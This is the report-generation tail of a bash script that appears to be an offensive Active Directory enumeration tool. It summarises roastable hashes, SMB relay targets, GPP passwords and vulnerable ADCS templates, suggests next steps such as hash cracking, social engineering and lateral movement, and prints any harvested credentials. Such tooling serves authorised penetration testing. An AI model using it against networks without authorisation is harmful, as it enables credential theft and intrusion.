$([ -s "$OUTDIR/attacks/asrep_hashes.txt" ] && echo "  [!] AS-REP Roastable Users: $(wc -l < "$OUTDIR/attacks/asrep_hashes.txt")")
$([ -s "$OUTDIR/attacks/kerberoast_hashes.txt" ] && echo "  [!] Kerberoastable Users: $(wc -l < "$OUTDIR/attacks/kerberoast_hashes.txt")")
$([ -s "$OUTDIR/vulns/relay_targets.txt" ] && echo "  [!] SMB Relay Possible (signing not enforced)")
$([ -s "$OUTDIR/vulns/unconstrained_delegation.txt" ] && echo "  [!] Unconstrained Delegation Found")
$([ -s "$OUTDIR/credentials/passwords_from_descriptions.txt" ] && echo "  [!] Passwords in LDAP Descriptions")
$(grep -qi "cpassword" "$OUTDIR/shares/"* 2>/dev/null && echo "  [!] GPP Passwords Found in SYSVOL")

═══════════════════════════════════════════════════════════════════════════
SECURITY MISCONFIGURATIONS
═══════════════════════════════════════════════════════════════════════════
$(grep -q "signing: False" "$OUTDIR/misc/smb_info.txt" 2>/dev/null && echo "  [!] SMB Signing Not Enforced")
$(grep -q "SMBv1" "$OUTDIR/misc/nmap_full.txt" 2>/dev/null && echo "  [!] SMBv1 Enabled (EternalBlue risk)")
$([ -s "$OUTDIR/misc/dns_zone.txt" ] && echo "  [!] DNS Zone Transfer Allowed")
$([ -s "$OUTDIR/vulns/adcs.txt" ] && echo "  [!] Vulnerable ADCS Templates")

═══════════════════════════════════════════════════════════════════════════
NEXT STEPS
═══════════════════════════════════════════════════════════════════════════
$([ "$TOTAL_CREDS" -eq 0 ] && cat << NEXTSTEPS
  1. Review password policy: $OUTDIR/misc/password_policy.txt
  2. Check user descriptions: $OUTDIR/ldap/user_descriptions.txt
  3. Manual hash cracking with custom wordlists/rules
  4. Web application enumeration if present
  5. Social engineering if no technical foothold

NEXTSTEPS
)

$([ "$TOTAL_CREDS" -gt 0 ] && cat << AUTHSTEPS
  1. Use discovered credentials for lateral movement
  2. Review BloodHound data for privilege escalation paths
  3. Check for further credential dumps (secretsdump output)
  4. Enumerate additional machines on network with valid creds

AUTHSTEPS
)

═══════════════════════════════════════════════════════════════════════════
Full enumeration output: $OUTDIR/
═══════════════════════════════════════════════════════════════════════════
EOF

cat "$OUTDIR/FINAL_REPORT.txt"

print_section "ENUMERATION COMPLETE!"
print_success "Full report: $OUTDIR/FINAL_REPORT.txt"
print_success "All output saved to: $OUTDIR/"

# Final credential reminder
if [ "$TOTAL_CREDS" -gt 0 ]; then
    echo ""
    print_critical "════════════════════════════════════════════════════════"
    print_critical "  VALID CREDENTIALS FOUND - READY FOR EXPLOITATION"
    print_critical "════════════════════════════════════════════════════════"
    cat "$OUTDIR/credentials/valid_creds.txt"
    print_critical "════════════════════════════════════════════════════════"
fi
